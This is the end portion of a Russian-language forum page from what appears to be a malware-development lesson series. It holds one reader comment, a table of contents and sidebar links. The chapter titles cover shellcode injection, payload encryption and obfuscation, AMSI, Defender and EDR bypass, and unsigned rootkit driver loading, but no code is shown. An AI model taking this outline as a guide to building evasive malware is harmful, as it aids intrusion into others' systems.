				<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--s" data-user-id="102" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1026af6.jpg?1756734897" srcset="/data/avatars/m/0/102.jpg?1756734897 2x" alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" itemprop="image" /> 
		</a>
			</div>
		</div>
		<span class="message-userArrow"></span>
	</header>

			</div>
			<div class="message-cell message-cell--main">
				<div class="js-quickEditTarget">
					<div class="message-content js-messageContent">
						<header class="message-attribution message-attribution--plain">
							<ul class="listInline listInline--bullet">
								<li class="message-attribution-user">
									<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--xxs" data-user-id="102" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1026af6.jpg?1756734897"  alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" /> 
		</a>
									<h4 class="attribution"><a href="https://osint42.org/members/hmcoba.102/" class="username " dir="auto" data-user-id="102" data-xf-init="member-tooltip"><span class="username--style2">HMCoba</span></a></h4>
								</li>
								<li>
									<a href="../../../comments/27/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-16T14:27:08+0300" data-timestamp="1750073228" data-date="16.06.2025" data-time="14:27" data-short="16 Июн" title="16.06.2025 в 14:27">16.06.2025</time></a>
								</li>
							</ul>
						</header>

						
						
						

						<div class="message-userContent lbContainer js-lbContainer"
							data-lb-id="ams-comment-27"
							data-lb-caption-desc="HMCoba &middot; 16.06.2025 в 14:27">

							<article class="message-body js-selectToQuote">
								<div class="bbWrapper">Отличный заход в тему Red Team. <br />
Такие статьи важны для практического понимания атакующих техник. <br />
Акцент на MDLC и реальное применение - то, чего часто не хватает. <br />
Буду следить за серией.</div>
								<div class="js-selectToQuoteEnd">&nbsp;</div>
							</article>

							
						</div>

						

						
							
	
		
			<aside class="message-signature">
			
				<div class="bbWrapper">HMCoba</div>
			
			</aside>
		
	

						
					</div>

					<footer class="message-footer">
						

						<div class="reactionsBar js-reactionsList is-active">
							
	
	
		<ul class="reactionSummary">
		
			<li><span class="reaction reaction--small reaction--1" data-reaction-id="1"><i aria-hidden="true"></i><img src="../../../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f44d.png" loading="lazy" width="64" height="64" class="reaction-image reaction-image--emoji js-reaction" alt="Like" title="Like" /></span></li>
		
		</ul>
	


<span class="u-srOnly">Реакции:</span>
<a class="reactionsBar-link" href="../../../comments/27/reactions.html" data-xf-click="overlay" data-cache="false" rel="nofollow"><bdi>Marat</bdi></a>
						</div>
					</footer>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</div>
			</div>
		</div>
	</article>

						
					
				
			</div>
		</div>

		<div class="block-outer block-outer--after">
			
			
		</div>

		
	
	

	</div>

	
	
	

	


		</div>
	</div>	



	



		







	



	




	
</div>
					
				</div>

				
					<div class="p-body-sidebar">
						
						
							<div class="block">
			<div class="block-container">
				<h3 class="block-header">ОГЛАВЛЕНИЕ</h3>
				<div class="block-body">
					<a class="blockLink " href="../../index.html">
						
							Зачем изучать разработку вредоносных программ ?
						
					</a>

					
						<a href="../instrumenty.1/index.html" class="blockLink ">
							 Инструменты</a>
					
						<a href="../tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="blockLink ">
							 Так какой-же язык выбрать !?</a>
					
						<a href="../shpargalka-po-arkhitekture-vindy.3/index.html" class="blockLink ">
							 Шпаргалка по архитектуре винды</a>
					
						<a href="../chto-takoye-payload-i-shell-code.5/index.html" class="blockLink ">
							 Что такое payload и shell code</a>
					
						<a href="../izuchayem-dinamicheskiye-biblioteki.6/index.html" class="blockLink ">
							 Изучаем динамические библиотеки</a>
					
						<a href="../protsessy-windows.7/index.html" class="blockLink ">
							 Процессы Windows</a>
					
						<a href="../vidy-detektov.8/index.html" class="blockLink ">
							 Виды детектов</a>
					
						<a href="../kuda-klast-nagruzku.9/index.html" class="blockLink ">
							 Куда класть нагрузку ?</a>
					
						<a href="../shifruyem-payload.10/index.html" class="blockLink ">
							 Шифруем Payload</a>
					
						<a href="../obfuskatsiya-payload.11/index.html" class="blockLink ">
							 Обфускация Payload</a>
					
						<a href="../lokal-nyi-zapusk-payload.12/index.html" class="blockLink ">
							 Локальный запуск Payload</a>
					
						<a href="../in-yektsiya-v-protsess.13/index.html" class="blockLink ">
							 Иньекция в процесс</a>
					
						<a href="../in-yektsiya-shell-koda-v-protsess.14/index.html" class="blockLink ">
							 Инъекция шелл-кода в процесс</a>
					
						<a href="../razmeshchayem-payload-udalenno-na-servere.15/index.html" class="blockLink ">
							 Размещаем Payload удаленно на сервере</a>
					
						<a href="../pryachem-payload-v-reyestre.16/index.html" class="blockLink ">
							 Прячем Payload в реестре</a>
					
						<a href="../razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="blockLink ">
							 Разборка с цифровой подписью зверька</a>
					
						<a href="../izuchayem-tekhniku-thread-hijacking.18/index.html" class="blockLink ">
							 Изучаем технику Thread Hijacking</a>
					
						<a href="../opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="blockLink ">
							 Определение PID нужного процесса, или перечисления процессов</a>
					
						<a href="../izuchayem-tekhniku-apc-injection.20/index.html" class="blockLink ">
							 Изучаем технику APC Injection</a>
					
						<a href="../vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="blockLink ">
							 Вызов кода через функции обратного вызова</a>
					
						<a href="../in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="blockLink ">
							 Инъекция отображаемой памяти</a>
					
						<a href="../izuchayem-tekhniku-stomping-injection.23/index.html" class="blockLink ">
							 Изучаем технику Stomping Injection</a>
					
						<a href="../kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="blockLink ">
							 Контроль выполнения полезной нагрузки</a>
					
						<a href="../izuchayem-tekhniku-spoofing.25/index.html" class="blockLink ">
							 Изучаем технику Spoofing</a>
					
						<a href="../skrytiye-strok.26/index.html" class="blockLink ">
							 Скрытие строк</a>
					
						<a href="../izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="blockLink ">
							 Изучаем кунгфу-1. Скрытие таблицы импорта</a>
					
						<a href="../kungfu-2-izuchayem-api-hooking.28/index.html" class="blockLink ">
							 Кунгфу-2.Изучаем API Hooking</a>
					
						<a href="../predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="blockLink ">
							 Предельная техника. Разборка с сисколами</a>
					
						<a href="index.html" class="blockLink is-selected">
							 Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
					
						<a href="../cherpayem-sily-v-antiotladke.31/index.html" class="blockLink ">
							 Черпаем силы в антиотладке</a>
					
						<a href="../obkhod-virtual-nykh-mashin.32/index.html" class="blockLink ">
							 Обход виртуальных машин</a>
					
						<a href="../otkryvayem-vrata-ada.33/index.html" class="blockLink ">
							 Открываем врата ада</a>
					
						<a href="../umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="blockLink ">
							 Уменьшение вероятности детекта зверька</a>
					
						<a href="../obkhod-windows-defender.35/index.html" class="blockLink ">
							 Обход Windows defender</a>
					
						<a href="../pro-endpoint-detection-and-response-edr.36/index.html" class="blockLink ">
							 Про Endpoint Detection and Response (EDR)</a>
					
						<a href="../pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="blockLink ">
							 Про детект в памяти. Ничего не поделаешь и это неизбежно)</a>
					
						<a href="../ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="blockLink ">
							 Огромная база исходников современных вирусов для разных платформ</a>
					
						<a href="../kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="blockLink ">
							 Как RootKit загрузить или же как загрузить драйвер без подписи</a>
					
						<a href="../obkhod-amsi.40/index.html" class="blockLink ">
							 Обход AMSI</a>
					
						<a href="../obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="blockLink ">
							 Обход AMSI при помощи хардварных точек останова</a>
					
						<a href="../uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="blockLink ">
							 Уклоняемся от поведенческого детекта антивируса и EDR</a>
					
						<a href="../obkhodim-antivirusy-i-edr.43/index.html" class="blockLink ">
							 Обходим антивирусы и EDR</a>
					
						<a href="../mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="blockLink ">
							 MutationGate - Новый подход работы с сисколами</a>
					
						<a href="../razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="blockLink ">
							 Разработка настоящего вируса в 2024 году</a>
					

					
						<a href="../../index9401.html?full=1" class="blockLink ">Просмотреть всю статью</a>
					
				</div>
			</div>
		</div>
						
							<div class="block">
		<div class="block-container">
			<h3 class="block-minorHeader">Информация о статье</h3>
			<div class="block-body block-row block-row--minor">
				<dl class="pairs pairs--justified">
					<dt>Автор</dt>
					
						<dd><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></dd>
					
				</dl>
				
					<dl class="pairs pairs--justified">
						<dt>Просмотры</dt>
						<dd>9 577</dd>
					</dl>
				
				
					<dl class="pairs pairs--justified">
						<dt>Комментарии</dt>
						<dd>2</dd>
					</dl>
				
				
				
					<dl class="pairs pairs--justified">
						<dt>Последнее обновление</dt>
						<dd><time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 Май" title="09.05.2025 в 16:44">09.05.2025</time></dd>
					</dl>
				
				
				

				
			</div>
		</div>
	</div>
						
							<div class="block">
			<div class="block-container">
				<h3 class="block-minorHeader"><a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html">Больше в Уроки разработки вредоносного софта</a></h3>
				<div class="block-body block-row">
					<ul class="articleSidebarList">
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../obkhod-antivirusov-cherez-uyazvimyi-draiver.71/index.html">Обход антивирусов через уязвимый драйвер</a>

			
			
			<div class="contentRow-snippet">
				Пока хакер не прикрыли, из-за дурацких законов, решил скопировать приватную статью.

Вот...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../unichtozhayem-signaturnyye-antivirusy.57/index.html">Уничтожаем сигнатурные антивирусы</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно такие тулзы были популярны, возможно и сейчас будет находкой, кто занимается...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/index.html">Скрытое управление компьютером на Windows, адовая статья</a>

			
			
			<div class="contentRow-snippet">
				Статья не новая, нашел на старом форуме, но не плохо описано всё.

Возможно какие-то команды...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../memorymodule-zagruzka-dll-iz-ozu.22/index.html">MemoryModule - Загрузка DLL из ОЗУ</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно писал свой загрузчик DLL, но сейчас на гитхабе наткнулся на более взрослый...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../pro-botnet-i-kak-delat-nel-zya.16/index.html">Про ботнет и как делать нельзя</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно участвовал в конкурсе статей на xss.is, мы решили для конкурса сделать ботнет...
			</div>				

			
		</div>
	</div>

						</li>
					
					</ul>
				</div>
			</div>
		</div>
						
							<div class="block">
			<div class="block-container">
				
					<h3 class="block-minorHeader"><a href="../../../authors/0x42.1/index.html">Больше от 0x42</a></h3>
				

				<div class="block-body block-row">
					<ul class="articleSidebarList">
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../o-tom-kak-boryut-sya-s-tor-v-rf.75/index.html">О том как борются с TOR в РФ</a>

			
			
			<div class="contentRow-snippet">
				Недавно решил поддержать проект TOR, решил поднять middle relay.

Напомню, что для поддержки...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../bezumnyi-maks-skam.74/index.html">Безумный МАКС/СКАМ</a>

			
			
			<div class="contentRow-snippet">
				По телевизору передают, что мессенджер МАКС полюбили россияне, зарегистрировалось почти вся...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../pochemu-v-linux-vse-fail.73/index.html">Почему в Linux всё — файл?</a>

			
			
			<div class="contentRow-snippet">
				---

## 🔹 Оглавление

[1. Философия UNIX: «Everything is a file»]
[2. Как работает VFS — Virtual...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../zashchita-ot-roskomnadzora.70/index.html">Защита от Роскомнадзора</a>

			
			
			<div class="contentRow-snippet">
				В связи с тем-что РКН внедрили ботов для автоматического поиска неугодного контента и...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../../../uyazvimosti-v-bash-skriptakh.69/index.html">Уязвимости в bash скриптах</a>

			
			
			<div class="contentRow-snippet">
				Вот кто хоть раз интересовался безопасностью, наверное помнят всякие инъекции в php и не...
			</div>				

			
		</div>
	</div>

						</li>
					
					</ul>
				</div>
			</div>
		</div>
						
							<div class="block">
				<div class="block-container">
					
						<h3 class="block-minorHeader">Поделиться этой страницей статьи</h3>
						
							<div class="block-body block-row block-row--separated">
								
									

	

	
		

		<div class="shareButtons shareButtons--iconic" data-xf-init="share-buttons" data-page-url="" data-page-title="" data-page-desc="" data-page-image="">
			<span class="u-anchorTarget" id="_xfUid-1-1758965536"></span>

			

			<div class="shareButtons-buttons">
				
					

					

					

					

					

					

					

					

					
						<a class="shareButtons-button shareButtons-button--email" href="#_xfUid-1-1758965536" data-href="mailto:?subject={title}&amp;body={url}">
							<i class="fa--xf far fa-envelope "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#envelope"></use></svg></i>
							<span>Электронная почта</span>
						</a>
					

					
						<a class="shareButtons-button shareButtons-button--share is-hidden" href="#_xfUid-1-1758965536"
							data-xf-init="web-share"
							data-title="" data-text="" data-url=""
							data-hide=".shareButtons-button:not(.shareButtons-button--share)">

							<i class="fa--xf far fa-share-alt "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#share-alt"></use></svg></i>
							<span>Поделиться</span>
						</a>
					

					
						<a class="shareButtons-button shareButtons-button--link is-hidden" href="#_xfUid-1-1758965536" data-clipboard="{url}">
							<i class="fa--xf far fa-link "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#link"></use></svg></i>
							<span>Ссылка</span>
						</a>
					
				
			</div>
		</div>
	

								
							</div>
						
						
							<div class="block-body block-row block-row--separated">
								
																		
										
	

	

	<div class="shareInput" data-xf-init="share-input" data-success-text="">
		
			<label class="shareInput-label" for="_xfUid-2-1758965536">Копировать BB-код адреса статьи</label>
		
		<div class="inputGroup inputGroup--joined">
			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
				data-xf-init="tooltip" title="Скопировать в буфер обмена">

				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
			</div>
			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[URL=&quot;https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/&quot;]Предельная техника-2. Практика. Реализуем техники инъекции через сисколы[/URL]" id="_xfUid-2-1758965536" />
		</div>
	</div>

									
									
										
	

	

	<div class="shareInput" data-xf-init="share-input" data-success-text="">
		
			<label class="shareInput-label" for="_xfUid-3-1758965536">Копировать BB-код статьи</label>
		
		<div class="inputGroup inputGroup--joined">
			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
				data-xf-init="tooltip" title="Скопировать в буфер обмена">

				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
			</div>
			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[AMS=page, 30][/AMS]" id="_xfUid-3-1758965536" />
		</div>
	</div>

																		
								
							</div>
						
					
				</div>
			</div>
						
						
					</div>
				
			</div>

			
			
	
		<ul class="p-breadcrumbs p-breadcrumbs--bottom"
			itemscope itemtype="https://schema.org/BreadcrumbList">
			
				

				
				

				

				
				
					
					
	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
		<a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
			<span itemprop="name">Уроки разработки вредоносного софта</span>
		</a>
		<meta itemprop="position" content="1" />
	</li>

				
			
		</ul>
	

			
		</div>
	</div>

	<footer class="p-footer" id="footer">
		<div class="p-footer-inner">

			<div class="p-footer-row">
				
					<div class="p-footer-row-main">
						<ul class="p-footer-linkList">
							
								
								
									<li>
										
											
											
												<a href="https://osint42.org/misc/style-variation" rel="nofollow"
													class="js-styleVariationsLink"
													data-xf-init="tooltip" title=" Выбор стиля"
													data-xf-click="menu" data-z-index-ref=".u-bottomFixer" role="button" aria-expanded="false" aria-haspopup="true">

													<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Выбор стиля</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
												</a>

												<div class="menu" data-menu="menu" aria-hidden="true">
													<div class="menu-content js-styleVariationsMenu">
														

	
		

	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965536%2C42f90e9dd95238e0acc8fc7e65edaff7"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="">

		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>

		
			Системный
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965536%2C42f90e9dd95238e0acc8fc7e65edaff7"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="default">

		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>

		
			Светлый
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965536%2C42f90e9dd95238e0acc8fc7e65edaff7"
		class="menu-linkRow is-selected"
		rel="nofollow"
		data-xf-click="style-variation" data-variation="alternate">

		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>

		
			Тёмный
		
	</a>

	

	
		
	

													</div>
												</div>
											
										
									</li>
								
								
									<li><a href="../../../../misc/language.html" data-xf-click="overlay"
										data-xf-init="tooltip" title="Выбор языка" rel="nofollow">
										<i class="fa--xf far fa-globe "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#globe"></use></svg></i> Русский (RU)</a></li>
								
							
						</ul>
					</div>
				
				<div class="p-footer-row-opposite">
					<ul class="p-footer-linkList">
						

						
							<li><a href="../../../../threads/pravila-resursa.56/index.html">Условия и правила</a></li>
						

						
							<li><a href="../../../../help/privacy-policy/index.html">Политика конфиденциальности</a></li>
						

						
							<li><a href="../../../../help/index.html">Помощь</a></li>
						

						
							<li><a href="../../../../forums/index.html">Главная</a></li>
						

						<li><a href="../../../../forums/-/index.rss" target="_blank" class="p-footer-rssLink" title="RSS"><span aria-hidden="true"><i class="fa--xf far fa-rss "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#rss"></use></svg></i><span class="u-srOnly">RSS</span></span></a></li>
					</ul>
				</div>
			</div>

			

			
		</div>
	</footer>
</div> <!-- closing p-pageWrapper -->

<div class="u-bottomFixer js-bottomFixTarget">
	
	
</div>

<div class="u-navButtons js-navButtons">
	<a href="javascript:" class="button button--scroll"><span class="button-text"><i class="fa--xf far fa-arrow-left "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-left"></use></svg></i><span class="u-srOnly">Назад</span></span></a>
</div>


	<div class="u-scrollButtons js-scrollButtons" data-trigger-type="both">
		<a href="#top" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-up "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-up"></use></svg></i><span class="u-srOnly">Верх</span></span></a>
		
			<a href="#footer" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-down "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-down"></use></svg></i><span class="u-srOnly">Низ</span></span></a>
		
	</div>



	<form style="display:none" hidden="hidden">
		<input type="text" name="_xfClientLoadTime" value="" id="_xfClientLoadTime" title="_xfClientLoadTime" tabindex="-1" />
	</form>

	





    
    
        
        
            <script type="application/ld+json">
                {
    "@context": "https://schema.org",
    "@type": "CreativeWorkSeries",
    "@id": "https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/",
    "name": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u041f\u0440\u0435\u0434\u0435\u043b\u044c\u043d\u0430\u044f \u0442\u0435\u0445\u043d\u0438\u043a\u0430-2. \u041f\u0440\u0430\u043a\u0442\u0438\u043a\u0430. \u0420\u0435\u0430\u043b\u0438\u0437\u0443\u0435\u043c \u0442\u0435\u0445\u043d\u0438\u043a\u0438 \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u0438 \u0447\u0435\u0440\u0435\u0437 \u0441\u0438\u0441\u043a\u043e\u043b\u044b",
    "headline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u041f\u0440\u0435\u0434\u0435\u043b\u044c\u043d\u0430\u044f \u0442\u0435\u0445\u043d\u0438\u043a\u0430-2. \u041f\u0440\u0430\u043a\u0442\u0438\u043a\u0430. \u0420\u0435\u0430\u043b\u0438\u0437\u0443\u0435\u043c \u0442\u0435\u0445\u043d\u0438\u043a\u0438 \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u0438 \u0447\u0435\u0440\u0435\u0437 \u0441\u0438\u0441\u043a\u043e\u043b\u044b",
    "alternativeHeadline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u041f\u0440\u0435\u0434\u0435\u043b\u044c\u043d\u0430\u044f \u0442\u0435\u0445\u043d\u0438\u043a\u0430-2. \u041f\u0440\u0430\u043a\u0442\u0438\u043a\u0430. \u0420\u0435\u0430\u043b\u0438\u0437\u0443\u0435\u043c \u0442\u0435\u0445\u043d\u0438\u043a\u0438 \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u0438 \u0447\u0435\u0440\u0435\u0437 \u0441\u0438\u0441\u043a\u043e\u043b\u044b",
    "description": "\u0412 \u043f\u0440\u043e\u0448\u043b\u043e\u0439 \u0441\u0442\u0430\u0442\u044c\u0435:\u041f\u0440\u0435\u0434\u0435\u043b\u044c\u043d\u0430\u044f \u0442\u0435\u0445\u043d\u0438\u043a\u0430. \u0420\u0430\u0437\u0431\u043e\u0440\u043a\u0430 \u0441 \u0441\u0438\u0441\u043a\u043e\u043b\u0430\u043c\u0438 | \u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" \u043c\u044b \u0440\u0430\u0437\u043e\u0431\u0440\u0430\u043b\u0438 \u0442\u0435\u043e\u0440\u0438\u044e.\n\n\u0414\u0430\u0432\u0430\u0439\u0442\u0435 \u0442\u0435\u043f\u0435\u0440\u044c \u043f\u0435\u0440\u0435\u0434\u0435\u043b\u0430\u0435\u043c \u0442\u0435\u0445\u043d\u0438\u043a\u0438...",
    "dateCreated": "2025-05-09T10:28:08+00:00",
    "dateModified": "2025-05-09T10:36:17+00:00",
    "author": {
        "@type": "Person",
        "name": "0x42"
    },
    "thumbnailUrl": "https://osint42.org/data/attachments/0/227-617ec7b35374fc4fb82dd47ecbdb78dc.jpg?hash=aos6xYS5-8",
    "interactionStatistic": {
        "@type": "InteractionCounter",
        "interactionType": "https://schema.org/LikeAction",
        "userInteractionCount": "0"
    }
}
            </script>
        
    



	
			
